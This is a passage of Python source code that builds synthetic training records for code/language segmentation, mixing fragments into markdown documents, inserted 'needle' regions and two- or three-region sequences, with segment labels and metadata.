                    int(pair_counts.get((second_lang, str(label)), 0)),
                    int(triple_counts.get((lang, second_lang, str(label)), 0)),
                    str(label),
                ),
            )
            if third_lang is None:
                continue
            third_lang = str(third_lang)
            mid_frag = rng.choice(fragments_by_lang[second_lang])
            tail_frag = rng.choice(fragments_by_lang[third_lang])
            host_text = _trim_text_to_budget(host.content.rstrip(), segment_budget, rng=rng)
            mid_text = _trim_text_to_budget(mid_frag.content.strip(), segment_budget, rng=rng)
            tail_text = _trim_text_to_budget(tail_frag.content.lstrip(), segment_budget, rng=rng)
            if not host_text or not mid_text or not tail_text:
                continue
            parts = [
                (lang, host_text + "\n\n"),
                (second_lang, mid_text + "\n\n"),
                (third_lang, tail_text),
            ]
            content, segments, langs = _join_parts(parts)
            meta = {
                "first_lang": lang,
                "second_lang": second_lang,
                "third_lang": third_lang,
                "host_uid": host.uid,
                "mid_uid": mid_frag.uid,
                "tail_uid": tail_frag.uid,
            }
            examples.append(_make_record(task, lang, idx, content, segments, langs, meta))
            second_role_counts[second_lang] += 1
            third_role_counts[third_lang] += 1
            pair_counts[(lang, second_lang)] += 1
            pair_counts[(second_lang, third_lang)] += 1
            triple_counts[(lang, second_lang, third_lang)] += 1
    return task, examples, desc


def _maybe_trim_text(text: str, max_chars: int = 512) -> str:
    if len(text) <= max_chars:
        return text
    head = max_chars // 2
    tail = max_chars - head
    return text[:head] + "\n…\n" + text[-tail:]


def _build_markdown_dataset(
    fragments_by_lang: Dict[str, List[Fragment]],
    per_label: int,
    rng: random.Random,
    *,
    task_name: str = "markdown_mix",
    wrapper_label: str = "markdown",
    markup_style: str = "markdown",
) -> Tuple[str, List[dict], str]:
    task = task_name
    pretty_label = "markdown" if wrapper_label == "markdown" else "reStructuredText"
    desc = f"Balanced {pretty_label} documents with diverse code/text interleavings."
    examples: List[dict] = []
    _log(f"📝 Building {task} dataset with balanced {pretty_label} curation...")
    labels = [
        lbl
        for lbl, frags in fragments_by_lang.items()
        if frags and lbl not in {"text", wrapper_label}
    ]
    other_lang_counts: Counter[str] = Counter()
    inline_lang_counts: Counter[str] = Counter()
    pair_counts: Counter[Tuple[str, str]] = Counter()
    role_wrapper_counts = {
        "host": Counter(),
        "other": Counter(),
    }
    inline_wrapper_counts: Counter[str] = Counter()
    text_available = bool(fragments_by_lang.get("text"))
    if not text_available:
        _log(f"⚠️  No 'text' fragments available; {task} will omit prose blocks.")

    def _sample_text_paragraph(max_chars: int = 256) -> Tuple[str, Optional[Fragment], bool]:
        snippet, frag = _sample_fragment_snippet(
            fragments_by_lang, "text", rng, max_chars=max_chars, min_letters=12, strip=True
        )
        if not snippet:
            snippet, frag = _sample_fallback_text_fragment(
                fragments_by_lang,
                rng,
                max_chars=max_chars,
                min_letters=8,
                min_length=32,
            )
        if not snippet:
            snippet, frag = _sample_fallback_text_fragment(
                fragments_by_lang,
                rng,
                max_chars=max_chars,
                min_letters=0,
                min_length=8,
            )
        synthetic = False
        snippet = snippet.strip()
        return snippet, frag, synthetic

    def _build_inline_markup(
        alt_lang: str,
        alt_snippet_raw: str,
        alt_clean: str,
    ) -> Optional[Tuple[List[str], str, List[str], str, bool, Optional[str]]]:
        if markup_style == "markdown":
            wrapper_modes = ["inline_backtick", "inline_fence", "html_code"]
        else:
            wrapper_modes = ["inline_literal", "inline_role"]

        ordered_modes = list(wrapper_modes)
        rng.shuffle(ordered_modes)
        ordered_modes.sort(key=lambda mode: (int(inline_wrapper_counts.get(mode, 0)), mode))
        lang_token = alt_lang.replace("_", "")

        for mode in ordered_modes:
            if mode == "inline_backtick":
                inline_body = " ".join(alt_clean.split()).replace("`", "'")[:160]
                if inline_body:
                    return ["`"], inline_body, ["`"], mode, True, None
            elif mode == "inline_fence":
                fenced_body = alt_snippet_raw.strip("\n")
                if fenced_body:
                    if not fenced_body.endswith("\n"):
                        fenced_body += "\n"
                    return [f"```{lang_token}\n"], fenced_body, ["```\n"], mode, False, lang_token
            elif mode == "html_code":
                html_body = alt_snippet_raw.replace("</code>", "&lt;/code&gt;")
                if html_body:
                    return [f"<code class=\"language-{lang_token}\">"], html_body, ["</code>"], mode, True, None
            elif mode == "inline_literal":
                inline_body = " ".join(alt_clean.split()).replace("``", "''")[:160]
                if inline_body:
                    return ["``"], inline_body, ["``"], mode, True, None
            elif mode == "inline_role":
                inline_body = " ".join(alt_clean.split()).replace("`", "'")[:160]
                if inline_body:
                    return [":code:`"], inline_body, ["`"], mode, True, None
        return None

    def _build_block_markup(
        block_lang: str,
        snippet_body: str,
        *,
        wrapped: bool,
        display_token: str,
    ) -> Tuple[List[str], str, List[str], bool]:
        if markup_style == "markdown":
            prefix_chunks: List[str] = []
            suffix_chunks: List[str] = []
            closed = False
            if wrapped:
                fence_prefix = "```"
                if display_token:
                    fence_prefix += display_token
                    if rng.random() < 0.3:
                        fence_prefix += " "
                fence_prefix += "\n"
                if rng.random() < 0.1:
                    fence_prefix = fence_prefix.rstrip("\n")
                prefix_chunks.append(fence_prefix)
                must_close = rng.random() < 0.9
                if must_close:
                    closing = "```\n"
                    if rng.random() < 0.35:
                        closing = closing.rstrip("\n")
                    suffix_chunks.append(closing)
                    closed = True
            elif rng.random() < 0.2:
                prefix_chunks.append("```\n")
            return prefix_chunks, snippet_body, suffix_chunks, closed

        indented_body = _indent_block_text(snippet_body)
        if wrapped:
            header = ".. code-block::"
            if display_token:
                header += f" {display_token}"
            header += "\n\n"
            return [header], indented_body, ["\n"], True
        return ["::\n\n"], indented_body, ["\n"], True

    for lang in labels:
        host_list = fragments_by_lang[lang]
        if not host_list:
            continue
        limit = min(per_label, len(host_list))
        alt_langs = [lbl for lbl in labels if lbl != lang]
        if not alt_langs:
            continue
        for idx in range(limit):
            host = host_list[idx]
            other_lang = _balanced_min_choice(
                alt_langs,
                rng,
                lambda label: (
                    int(other_lang_counts.get(str(label), 0)),
                    int(pair_counts.get((lang, str(label)), 0)),
                    str(label),
                ),
            )
            if other_lang is None:
                continue
            other_lang = str(other_lang)
            other_pool = fragments_by_lang.get(other_lang)
            if not other_pool:
                continue
            other = rng.choice(other_pool)

            host_snippet = _clean_snippet_text(host.content).strip()
            host_snippet = _trim_text_to_budget(host_snippet, 540, rng=rng).strip()
            if not host_snippet:
                continue
            other_snippet = _clean_snippet_text(other.content).strip()
            other_snippet = _trim_text_to_budget(other_snippet, 360, rng=rng).strip()
            if not other_snippet:
                continue

            wrap_host = _choose_balanced_bool(role_wrapper_counts["host"], rng)
            wrap_other = _choose_balanced_bool(role_wrapper_counts["other"], rng)

            code_lids = [lbl for lbl in labels if fragments_by_lang.get(lbl)]

            content_chunks: List[str] = []
            segments: List[dict] = []
            langs_seen: List[str] = []
            cursor = 0

            inline_blocks: List[dict] = []
            markdown_blocks: List[dict] = []

            def append_part(label: str, text: str) -> Optional[dict]:
                nonlocal cursor
                if not text:
                    return None
                normalized = _normalize_text(text)
                if not normalized:
                    return None
                start = cursor
                end = start + len(normalized)
                content_chunks.append(normalized)
                seg = _segment(label, start, end)
                segments.append(seg)
                langs_seen.append(label)
                cursor = end
                return seg

            def append_markdown_text(
                paragraph: str,
                paragraph_frag: Optional[Fragment],
                synthetic: bool,
                role: str,
                *,
                suffix: str = "",
            ) -> None:
                if not (paragraph or suffix):
                    return

                embed = bool(code_lids) and rng.random() < _MARKDOWN_INLINE_CODE_PROB
                alt_pool = [lbl for lbl in code_lids if lbl != lang]
                if not embed or not alt_pool:
                    if paragraph:
                        append_part(wrapper_label, paragraph)
                    if suffix:
                        append_part(wrapper_label, suffix)
                    return

                alt_lang = _balanced_min_choice(
                    alt_pool,
                    rng,
                    lambda label: (
                        int(inline_lang_counts.get(str(label), 0)),
                        int(other_lang_counts.get(str(label), 0)),
                        str(label),
                    ),
                )
                if alt_lang is None:
                    if paragraph:
                        append_part(wrapper_label, paragraph)
                    if suffix:
                        append_part(wrapper_label, suffix)
                    return
                alt_lang = str(alt_lang)
                alt_snippet_raw, alt_fragment = _sample_fragment_snippet(
                    fragments_by_lang, alt_lang, rng, max_chars=160, strip=True
                )
                alt_clean = alt_snippet_raw.strip()
                if not alt_clean:
                    if paragraph:
                        append_part(wrapper_label, paragraph)
                    if suffix:
                        append_part(wrapper_label, suffix)
                    return

                inline_markup = _build_inline_markup(alt_lang, alt_snippet_raw, alt_clean)
                if inline_markup is None:
                    if paragraph:
                        append_part(wrapper_label, paragraph)
                    if suffix:
                        append_part(wrapper_label, suffix)
                    return
                pre_markup, code_text, post_markup, wrapper_type, spacer_after, display_label = inline_markup

                content = paragraph or ""
                insertion = len(content) // 2
                if insertion < len(content):
                    while insertion < len(content) and not content[insertion].isspace():
                        insertion += 1
                if insertion >= len(content):
                    insertion = len(content) // 2
                    while insertion > 0 and not content[insertion - 1].isspace():
                        insertion -= 1

                prefix_text = content[:insertion]
                suffix_text = content[insertion:]

                if prefix_text:
                    append_part(wrapper_label, prefix_text)
                if prefix_text and not prefix_text.endswith((" ", "\t", "\n")):
                    append_part(wrapper_label, " ")

                for chunk in pre_markup:
                    append_part(wrapper_label, chunk)

                code_seg = append_part(alt_lang, code_text)
                if code_seg:
                    inline_blocks.append(
                        {
                            "language": alt_lang,
                            "wrapper": wrapper_type,
                            "display_label": display_label,
                            "char_start": code_seg["char_start"],
                            "char_end": code_seg["char_end"],
                            "context_role": role,
                            "source_uid": alt_fragment.uid if alt_fragment else None,
                        }
                    )
                    inline_lang_counts[alt_lang] += 1
                    inline_wrapper_counts[wrapper_type] += 1

                for chunk in post_markup:
                    append_part(wrapper_label, chunk)

                trailing = suffix_text + suffix
                if spacer_after and trailing and not trailing[0].isspace():
                    append_part(wrapper_label, " ")
                if trailing:
                    append_part(wrapper_label, trailing)

            intro_text, intro_frag, intro_synth = _sample_text_paragraph(240)
            if rng.random() < 0.65:
                append_markdown_text(intro_text, intro_frag, intro_synth, "intro_text", suffix="\n\n")

            block_plan: List[Dict[str, Any]] = [
                {
                    "role": "host",
                    "language": lang,
                    "snippet": host_snippet,
                    "fragment": host,
                    "wrapped": wrap_host,
                }
            ]
            alt_block_snippet = other_snippet
            block_plan.append(
                {
                    "role": "other",
                    "language": other_lang,
                    "snippet": alt_block_snippet,
                    "fragment": other,
                    "wrapped": wrap_other,
                }
            )

            if len(block_plan) > 1 and rng.random() < 0.5:
                rng.shuffle(block_plan)

            host_block_meta: Optional[dict] = None
            other_block_meta: Optional[dict] = None

            for block_idx, block in enumerate(block_plan):
                block_role = block["role"]
                block_lang = block["language"]
                block_fragment = block["fragment"]
                block_snippet = block["snippet"]
                wrapped = bool(block.get("wrapped", False))

                include_lang = rng.random() < 0.85
                mismatch = include_lang and rng.random() < 0.2 and len(labels) > 1
                display_lang_name = ""
                display_token = ""
                if wrapped and include_lang:
                    candidate = block_lang
                    if mismatch:
                        alternatives = [lbl for lbl in labels if lbl != block_lang]
                        if alternatives:
                            candidate = rng.choice(alternatives)
                        else:
                            mismatch = False
                    display_lang_name = candidate
                    display_token = candidate.replace("_", "")

                snippet_body = block_snippet
                if rng.random() < 0.4:
                    snippet_body = snippet_body.strip()
                if not snippet_body.endswith("\n"):
                    snippet_body += "\n"
                if rng.random() < 0.25:
                    snippet_body = "\n".join(line.rstrip() for line in snippet_body.splitlines()) + "\n"

                prefix_chunks, code_text, suffix_chunks, closed = _build_block_markup(
                    block_lang,
                    snippet_body,
                    wrapped=wrapped,
                    display_token=display_token,
                )
                for chunk in prefix_chunks:
                    append_part(wrapper_label, chunk)

                code_segment = append_part(block_lang, code_text)

                for chunk in suffix_chunks:
                    append_part(wrapper_label, chunk)

                if code_segment:
                    block_entry = {
                        "role": block_role,
                        "wrapped": bool(wrapped),
                        "language": block_lang,
                        "display_label": display_token,
                        "display_language": display_lang_name,
                        "mismatched": bool(
                            wrapped
                            and include_lang
                            and mismatch
                            and display_lang_name
                            and display_lang_name != block_lang
                        ),
                        "char_start": code_segment["char_start"],
                        "char_end": code_segment["char_end"],
                        "source_uid": block_fragment.uid if block_fragment else None,
                        "wrapper": "wrapped" if wrapped else "plain",
                        "closed": closed,
                    }
                    markdown_blocks.append(block_entry)
                    if block_role == "host":
                        host_block_meta = block_entry
                    elif block_role == "other":
                        other_block_meta = block_entry

                if block_idx < len(block_plan) - 1 and rng.random() < 0.75:
                    between_text, between_frag, between_synth = _sample_text_paragraph(180)
                    joiner = "\n\n" if rng.random() < 0.5 else "\n"
                    append_markdown_text(between_text, between_frag, between_synth, "between_text", suffix=joiner)
                elif block_idx < len(block_plan) - 1 and markup_style == "markdown" and rng.random() < 0.3:
                    append_part(wrapper_label, "```\n")

            if rng.random() < 0.65:
                outro_text, outro_frag, outro_synth = _sample_text_paragraph(200)
                tail = "\n" if rng.random() < 0.7 else ""
                append_markdown_text(outro_text, outro_frag, outro_synth, "outro_text", suffix=tail)

            if markup_style == "markdown" and rng.random() < 0.3:
                append_part(wrapper_label, "```")

            if not any(seg["label"] != wrapper_label for seg in segments):
                continue

            content = "".join(content_chunks)
            host_display_token = host_block_meta["display_label"] if host_block_meta else ""
            host_display_language = host_block_meta["display_language"] if host_block_meta else ""
            other_display_token = other_block_meta["display_label"] if other_block_meta else ""
            other_display_language = other_block_meta["display_language"] if other_block_meta else ""

            meta = {
                "host_lang": lang,
                "host_uid": host.uid,
                "other_lang": other_lang,
                "other_uid": other.uid,
                "wrapped_host": bool(host_block_meta.get("wrapped") if host_block_meta else wrap_host),
                "wrapped_other": bool(other_block_meta.get("wrapped") if other_block_meta else wrap_other),
                "host_fence_label": host_display_token,
                "host_fence_language": host_display_language,
                "host_fence_mismatch": bool(host_block_meta.get("mismatched") if host_block_meta else False),
                "other_fence_label": other_display_token,
                "other_fence_language": other_display_language,
                "other_fence_mismatch": bool(other_block_meta.get("mismatched") if other_block_meta else False),
                "markdown_blocks": markdown_blocks,
                "inline_blocks": inline_blocks,
            }
            examples.append(
                _make_record(task, lang, idx, content, segments, langs_seen, meta)
            )
            other_lang_counts[other_lang] += 1
            pair_counts[(lang, other_lang)] += 1
            role_wrapper_counts["host"][bool(host_block_meta.get("wrapped") if host_block_meta else wrap_host)] += 1
            role_wrapper_counts["other"][bool(other_block_meta.get("wrapped") if other_block_meta else wrap_other)] += 1

    return task, examples, desc


def _build_markdown_dataset_from_monitor(
    monitor_docs: Sequence[MonitorDoc],
    per_label: int,
    rng: random.Random,
    *,
    host_declared_lang: str = "markdown",
    task_name: str = "markdown_mix",
    host_label_for_record: Optional[str] = None,
    custom_desc: Optional[str] = None,
) -> Tuple[str, List[dict], str]:
    """Build markdown-like mix task from real monitor docs for a given host type."""

    task = task_name
    host_label = host_label_for_record or host_declared_lang
    desc = custom_desc or f"Monitor {host_declared_lang} documents with natural code/text interleavings."
    examples: List[dict] = []
    _log(f"📝 Building {task} dataset from monitor set for '{host_declared_lang}'...")

    # Only consider documents whose declared type matches the requested host language.
    host_docs = [doc for doc in monitor_docs if doc.declared_lang == host_declared_lang]
    if not host_docs:
        _log(f"⚠️  No monitor documents found for '{host_declared_lang}'; skipping {task}.")
        return task, examples, desc

    rng.shuffle(host_docs)
    max_examples = len(host_docs)
    if per_label > 0:
        max_examples = min(max_examples, per_label)

    for idx, doc in enumerate(host_docs[:max_examples]):
        if not doc.segments:
            continue

        # Require at least one non-text/code segment inside the markdown-like host.
        nontext_segments = [
            seg
            for seg in doc.segments
            if str(seg.get("label", "")) not in {"text", host_declared_lang}
        ]
        if not nontext_segments:
            continue

        # Rebuild segments using the original labels from the monitor document.
        segments: List[dict] = []
        for seg in doc.segments:
            label = str(seg.get("label", ""))
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
            if end <= start:
                continue
            segments.append(_segment(label, start, end))
        if not segments:
            continue

        langs = sorted({seg["label"] for seg in segments if seg.get("label")})

        # Treat each non-text segment as a markdown code "block".
        markdown_blocks: List[dict] = []
        for seg in nontext_segments:
            start = int(seg.get("char_start", 0))
            end = int(seg.get("char_end", start))
            if end <= start:
                continue
            lang = str(seg.get("label", ""))
            markdown_blocks.append(
                {
                    "role": "other",
                    "wrapped": False,
                    "language": lang,
                    "display_label": "",
                    "display_language": "",
                    "mismatched": False,
                    "char_start": start,
                    "char_end": end,
                    "source_uid": doc.uid,
                    "wrapper": "plain",
                    "closed": True,
                }
            )

        meta = {
            "markdown_blocks": markdown_blocks,
            "inline_blocks": [],
            "monitor_source": doc.source,
        }
        examples.append(
            _make_record(
                task,
                host_label,
                idx,
                doc.content,
                segments,
                langs,
                meta,
            )
        )

    return task, examples, desc


def _pop_unused_region(
    pool: Sequence[MonitorRegion],
    used_ids: Set[Tuple[Optional[str], str, int, int]],
) -> Optional[MonitorRegion]:
    for region in pool:
        region_id = _region_identity(region)
        if region_id in used_ids:
            continue
        used_ids.add(region_id)
        return region
    return None


def _build_injection_dataset_from_monitor(
    monitor_docs: Sequence[MonitorDoc],
    per_label: int,
    bucket_name: str,
    min_visible: int,
    max_visible: Optional[int],
    rng: random.Random,
) -> Tuple[str, List[dict], str, Dict[str, Any]]:
    task = f"needle_{bucket_name}"
    desc = (
        "Segment-backed host monitor windows with an inserted foreign region sized "
        f"{min_visible}-{'∞' if max_visible is None else max_visible} visible chars (whitespace ignored)."
    )
    examples: List[dict] = []
    _log(
        f"💉 Building segment-backed injection dataset for size {min_visible}-"
        f"{'∞' if max_visible is None else max_visible} visible chars..."
    )

    host_pools = _collect_host_dominant_regions(
        monitor_docs,
        rng,
        max_chars=int(cfg.MODEL_WINDOW_BYTES),
        min_ratio=_PURE_FRAGMENT_HOST_MIN_RATIO,
    )
    donor_pools = _collect_line_block_regions(
        monitor_docs,
        min_visible=min_visible,
        max_visible=max_visible,
        exclude_labels=_PROHIBITED_MONITOR_DONOR_LANGS,
        strip_first_line_indent=True,
        max_regions_per_segment=_NEEDLE_DONOR_MAX_LINE_CANDIDATES_PER_SEGMENT,
    )
    donor_visible_support = _visible_support_by_label(donor_pools)
    donor_labels_present = {
        str(seg.get("label", ""))
        for doc in monitor_docs
        for seg in doc.segments
        if str(seg.get("label", "")) and str(seg.get("label", "")) not in _PROHIBITED_MONITOR_DONOR_LANGS
    }
    under_floor = {
        label
        for label in donor_labels_present
        if int(donor_visible_support.get(label, 0)) < int(_NEEDLE_DONOR_MIN_VISIBLE_SUPPORT)
    }
    if under_floor:
        clipped_pools = _collect_clipped_regions(
            monitor_docs,
            min_visible=min_visible,
            max_visible=max_visible,
            exclude_labels=_PROHIBITED_MONITOR_DONOR_LANGS,
            allowed_labels=under_floor,
            strip_first_line_indent=False,
        )
        donor_pools = _merge_region_pools(donor_pools, clipped_pools)
        donor_visible_support = _visible_support_by_label(donor_pools)
        under_floor = {
            label
            for label in donor_labels_present
            if int(donor_visible_support.get(label, 0)) < int(_NEEDLE_DONOR_MIN_VISIBLE_SUPPORT)
        }
    qualified_donor_labels = {
        label
        for label, visible in donor_visible_support.items()
        if int(visible) >= int(_NEEDLE_DONOR_MIN_VISIBLE_SUPPORT)
    }

    host_candidate_counts = {label: len(pool) for label, pool in host_pools.items() if pool}
    actual_counts: Counter[str] = Counter()
    donor_counts: Counter[str] = Counter()
    donor_visible_selected: Counter[str] = Counter()
    pair_counts: Counter[Tuple[str, str]] = Counter()

    host_labels = sorted(host_pools.keys())
    host_shuffled = {label: list(pool) for label, pool in host_pools.items()}
    donor_shuffled = {label: list(pool) for label, pool in donor_pools.items()}
    for pool in host_shuffled.values():
        rng.shuffle(pool)
    for pool in donor_shuffled.values():
        rng.shuffle(pool)
    host_positions: Counter[str] = Counter()
    donor_positions: Counter[str] = Counter()
    next_index = 0

    progress = True
    while progress:
        progress = False
        for host_lang in host_labels:
            if int(actual_counts.get(host_lang, 0)) >= int(per_label):
                continue
            host_region = _pop_next_region(host_shuffled, host_positions, host_lang)
            if host_region is None:
                continue
            donor_labels = [
                label
                for label in sorted(qualified_donor_labels)
                if label != host_lang and _next_region(donor_shuffled, donor_positions, label) is not None
            ]
            if not donor_labels:
                continue
            donor_lang = _balanced_min_choice(
                donor_labels,
                rng,
                lambda label: (
                    int(donor_visible_selected.get(label, 0)),
                    int(pair_counts.get((host_lang, label), 0)),
                    int(donor_counts.get(label, 0)),
                    label,
                ),
            )
            donor_region = _pop_next_region(donor_shuffled, donor_positions, str(donor_lang)) if donor_lang is not None else None
            if donor_region is None or donor_lang is None:
                continue

            insertion = _inject_snippet_text(host_region.content, donor_region.content, rng)
            context_label = _context_label_at_insertion(
                host_region.segments,
                insertion.insertion_char,
                host_lang,
            )
            inserted_segments: List[dict] = []
            cursor = 0
            if insertion.context_prefix:
                inserted_segments.append(_segment(context_label, cursor, cursor + len(insertion.context_prefix)))
                cursor += len(insertion.context_prefix)
            _append_shifted_segments(inserted_segments, donor_region.segments, cursor)
            cursor += len(donor_region.content)
            if insertion.context_suffix:
                inserted_segments.append(_segment(context_label, cursor, cursor + len(insertion.context_suffix)))
                cursor += len(insertion.context_suffix)
            new_segments = _insert_segment_list_at_offset(
                host_region.segments,
                insertion.insertion_char,
                inserted_segments,
            )

            new_content = insertion.content
            langs = sorted({seg["label"] for seg in new_segments if seg.get("label")})
            meta = {
                "host_lang": host_lang,
                "host_uid": host_region.source_uid,
                "host_label_ratio": float(host_region.anchor_ratio),
                "host_window_char_start": int(host_region.source_char_start),
                "host_window_char_end": int(host_region.source_char_end),
                "donor_lang": donor_lang,
                "donor_uid": donor_region.source_uid,
                "donor_start_line_source_char": int(donor_region.source_char_start),
                "donor_end_line_source_char": int(donor_region.source_char_end),
                "insertion_char": int(insertion.insertion_char),
                "needle_char_start": int(insertion.snippet_char_start),
                "needle_char_end": int(insertion.snippet_char_end),
                "inserted_char_start": int(insertion.snippet_char_start),
                "inserted_char_end": int(insertion.snippet_char_end),
                "inserted_anchor_label": donor_lang,
                "inserted_anchor_ratio": float(donor_region.anchor_ratio),
                "inserted_source_char_start": int(donor_region.source_char_start),
                "inserted_source_char_end": int(donor_region.source_char_end),
                "inserted_source_labels": list(donor_region.source_labels),
                "context_prefix": insertion.context_prefix,
                "context_suffix": insertion.context_suffix,
                "injection_style": insertion.injection_style,
                "injection_visible_chars": int(donor_region.visible_chars),
                "size_bucket": bucket_name,
            }
            examples.append(_make_record(task, host_lang, next_index, new_content, new_segments, langs, meta))
            next_index += 1
            actual_counts[host_lang] += 1
            donor_counts[str(donor_lang)] += 1
            donor_visible_selected[str(donor_lang)] += int(donor_region.visible_chars)
            pair_counts[(host_lang, donor_lang)] += 1
            progress = True

    support = _task_support_summary(
        requested_per_anchor_label=per_label,
        candidate_counts=host_candidate_counts,
        actual_counts=actual_counts,
    )
    donor_candidate_counts = {label: len(pool) for label, pool in donor_pools.items() if pool}
    donor_candidate_visible = {label: int(donor_visible_support.get(label, 0)) for label in donor_candidate_counts}
    donor_support_shortfall = {
        label: max(0, int(_NEEDLE_DONOR_MIN_VISIBLE_SUPPORT) - int(donor_candidate_visible.get(label, 0)))
        for label in donor_candidate_counts
    }
    support["donor_floor_visible_chars"] = int(_NEEDLE_DONOR_MIN_VISIBLE_SUPPORT)
    support["qualified_donor_labels"] = sorted(qualified_donor_labels)
    support["donor_candidate_regions_by_donor_label"] = donor_candidate_counts
    support["donor_candidate_regions_by_anchor_label"] = donor_candidate_counts
    support["donor_candidate_visible_support_by_donor_label"] = donor_candidate_visible
    support["donor_selected_visible_support_by_donor_label"] = {
        label: int(donor_visible_selected.get(label, 0))
        for label in donor_candidate_counts
    }
    support["donor_actual_by_donor_label"] = {
        label: int(donor_counts.get(label, 0))
        for label in donor_candidate_counts
    }
    support["donor_support_shortfall_by_donor_label"] = donor_support_shortfall
    return task, examples, desc, support


def _build_pair_dataset_from_monitor(
    monitor_docs: Sequence[MonitorDoc],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str, Dict[str, Any]]:
    task = "sequence_pair"
    desc = "Two-region back-to-back sequences from segment-backed monitor regions."
    examples: List[dict] = []
    _log("🔄 Building sequence pair dataset from segment-backed monitor regions...")
    segment_budget = max(192, int((cfg.MODEL_WINDOW_BYTES - 8) // 2))
    region_pools = _collect_anchor_window_regions(
        monitor_docs,
        max_chars=segment_budget,
        min_anchor_ratio=_MIXED_REGION_MIN_RATIO,
    )
    labels = sorted(region_pools.keys())
    candidate_counts = {label: len(pool) for label, pool in region_pools.items() if pool}
    actual_counts: Counter[str] = Counter()
    second_role_counts: Counter[str] = Counter()
    pair_counts: Counter[Tuple[str, str]] = Counter()
    used_ids: Set[Tuple[Optional[str], str, int, int]] = set()
    shuffled_pools = {label: list(pool) for label, pool in region_pools.items()}
    for pool in shuffled_pools.values():
        rng.shuffle(pool)

    for lang in labels:
        host_pool = shuffled_pools.get(lang, [])
        if not host_pool:
            continue
        for idx in range(per_label):
            host_region = _pop_unused_region(host_pool, used_ids)
            if host_region is None:
                break
            partners = [lbl for lbl in labels if lbl != lang and shuffled_pools.get(lbl)]
            if not partners:
                break
            partners.sort(
                key=lambda label: (
                    int(second_role_counts.get(label, 0)),
                    int(pair_counts.get((lang, label), 0)),
                    label,
                )
            )
            partner_region: Optional[MonitorRegion] = None
            partner_lang: Optional[str] = None
            for candidate in partners:
                region = _pop_unused_region(shuffled_pools.get(candidate, []), used_ids)
                if region is None:
                    continue
                partner_region = region
                partner_lang = candidate
                break
            if partner_region is None or partner_lang is None:
                break

            parts: List[str] = []
            segments: List[dict] = []
            cursor = 0
            parts.append(host_region.content)
            _append_shifted_segments(segments, host_region.segments, cursor)
            cursor += len(host_region.content)
            parts.append("\n\n")
            segments.append(_segment(lang, cursor, cursor + 2))
            cursor += 2
            parts.append(partner_region.content)
            _append_shifted_segments(segments, partner_region.segments, cursor)
            cursor += len(partner_region.content)
            content = _normalize_text("".join(parts))
            shifted_segments = _merge_adjacent_segments(segments)
            langs = sorted({seg["label"] for seg in shifted_segments if seg.get("label")})
            first_end = len(host_region.content)
            second_start = first_end + 2
            second_end = second_start + len(partner_region.content)
            meta = {
                "first_lang": lang,
                "second_lang": partner_lang,
                "host_uid": host_region.source_uid,
                "partner_uid": partner_region.source_uid,
                "sequence_regions": {
                    "first": {
                        "char_start": 0,
                        "char_end": first_end,
                        "anchor_label": lang,
                        "anchor_ratio": float(host_region.anchor_ratio),
                        "source_uid": host_region.source_uid,
                        "source_char_start": int(host_region.source_char_start),
                        "source_char_end": int(host_region.source_char_end),
                    },
                    "second": {
                        "char_start": second_start,
                        "char_end": second_end,
                        "anchor_label": partner_lang,
                        "anchor_ratio": float(partner_region.anchor_ratio),
                        "source_uid": partner_region.source_uid,
                        "source_char_start": int(partner_region.source_char_start),
                        "source_char_end": int(partner_region.source_char_end),
                    },
                },
            }
            examples.append(_make_record(task, lang, idx, content, shifted_segments, langs, meta))
            actual_counts[lang] += 1
            second_role_counts[partner_lang] += 1
            pair_counts[(lang, partner_lang)] += 1

    support = _task_support_summary(
        requested_per_anchor_label=per_label,
        candidate_counts=candidate_counts,
        actual_counts=actual_counts,
    )
    return task, examples, desc, support


def _build_triplet_dataset_from_monitor(
    monitor_docs: Sequence[MonitorDoc],
    per_label: int,
    rng: random.Random,
) -> Tuple[str, List[dict], str, Dict[str, Any]]:
    task = "sequence_triplet"
    desc = "Three-region back-to-back sequences from segment-backed monitor regions."
    examples: List[dict] = []
    _log("🔄 Building sequence triplet dataset from segment-backed monitor regions...")
    segment_budget = max(160, int((cfg.MODEL_WINDOW_BYTES - 12) // 3))
    region_pools = _collect_anchor_window_regions(
        monitor_docs,
        max_chars=segment_budget,
        min_anchor_ratio=_MIXED_REGION_MIN_RATIO,
    )
    labels = sorted(region_pools.keys())
    candidate_counts = {label: len(pool) for label, pool in region_pools.items() if pool}
    actual_counts: Counter[str] = Counter()
    second_role_counts: Counter[str] = Counter()
    third_role_counts: Counter[str] = Counter()
    pair_counts: Counter[Tuple[str, str]] = Counter()
    triple_counts: Counter[Tuple[str, str, str]] = Counter()
    used_ids: Set[Tuple[Optional[str], str, int, int]] = set()
    shuffled_pools = {label: list(pool) for label, pool in region_pools.items()}
    for pool in shuffled_pools.values():
        rng.shuffle(pool)

    for lang in labels:
        host_pool = shuffled_pools.get(lang, [])
        if not host_pool:
            continue
        for idx in range(per_label):
            first_region = _pop_unused_region(host_pool, used_ids)
            if first_region is None:
                break
            others = [lbl for lbl in labels if lbl != lang and shuffled_pools.get(lbl)]
            if len(others) < 2:
                break
            others.sort(
                key=lambda label: (
                    int(second_role_counts.get(label, 0)),
                    int(pair_counts.get((lang, label), 0)),
                    label,
                )
            )
            second_region: Optional[MonitorRegion] = None
            second_lang: Optional[str] = None
            for candidate in others:
                region = _pop_unused_region(shuffled_pools.get(candidate, []), used_ids)
                if region is None:
                    continue
                second_region = region
                second_lang = candidate
                break
            if second_region is None or second_lang is None:
                break
            third_candidates = [lbl for lbl in others if lbl != second_lang and shuffled_pools.get(lbl)]
            third_candidates.sort(
                key=lambda label: (
                    int(third_role_counts.get(label, 0)),
                    int(pair_counts.get((second_lang, label), 0)),
                    int(triple_counts.get((lang, second_lang, label), 0)),
                    label,
                )
            )
            third_region: Optional[MonitorRegion] = None
            third_lang: Optional[str] = None
            for candidate in third_candidates:
                region = _pop_unused_region(shuffled_pools.get(candidate, []), used_ids)
                if region is None:
                    continue
                third_region = region
                third_lang = candidate
                break
            if third_region is None or third_lang is None:
                break

            parts: List[str] = []
            segments: List[dict] = []
            cursor = 0
            region_meta: Dict[str, Dict[str, Any]] = {}
            for key, region, label in (
                ("first", first_region, lang),
                ("second", second_region, second_lang),
                ("third", third_region, third_lang),
            ):
                start = cursor
                parts.append(region.content)
                _append_shifted_segments(segments, region.segments, cursor)
                cursor += len(region.content)
                end = cursor
                region_meta[key] = {
                    "char_start": start,
                    "char_end": end,
                    "anchor_label": label,
                    "anchor_ratio": float(region.anchor_ratio),
                    "source_uid": region.source_uid,
